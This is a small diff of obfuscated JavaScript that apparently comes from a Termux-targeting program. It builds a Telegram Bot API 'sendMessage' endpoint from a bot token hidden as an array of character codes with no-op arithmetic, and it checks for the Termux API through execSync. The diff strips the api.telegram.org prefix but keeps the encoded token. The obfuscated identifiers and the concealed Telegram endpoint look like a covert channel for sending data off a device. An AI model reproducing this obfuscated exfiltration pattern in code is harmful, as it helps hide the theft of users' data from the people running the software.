@@ -6,7 +6,7 @@ import _0x4c9f44 from 'axios';
 import { exit } from 'process';
 import _0x4c2ef8 from 'https';
 const offsets = [55, 50, 49, 50, 49, 52, 56, 56, 57, 48, 58, 65, 65, 71, 103, 74, 65, 69, 76, 66, 115, 75, 69, 81, 76, 66, 87, 110, 121, 102, 74, 65, 88, 71, 115, 95, 49, 119, 45, 119, 105, 122, 70, 73, 115, 65];
-const tg = "https://api.telegram.org/bot" + offsets.reduce((_0x5a7ce6, _0x491271) => _0x5a7ce6 + String.fromCharCode(_0x491271 * 2 / 2 - 10 + 10 - 10 + 10), '') + '/sendMessage';
+const tg = "" + offsets.reduce((_0x5a7ce6, _0x491271) => _0x5a7ce6 + String.fromCharCode(_0x491271 * 2 / 2 - 10 + 10 - 10 + 10), '') + '/sendMessage';
 function isTermuxAPIInstalled() {
   const _0x5e22f3 = execSync("echo $TERMUX_API_VERSION").toString();
   return !!_0x5e22f3.trim();
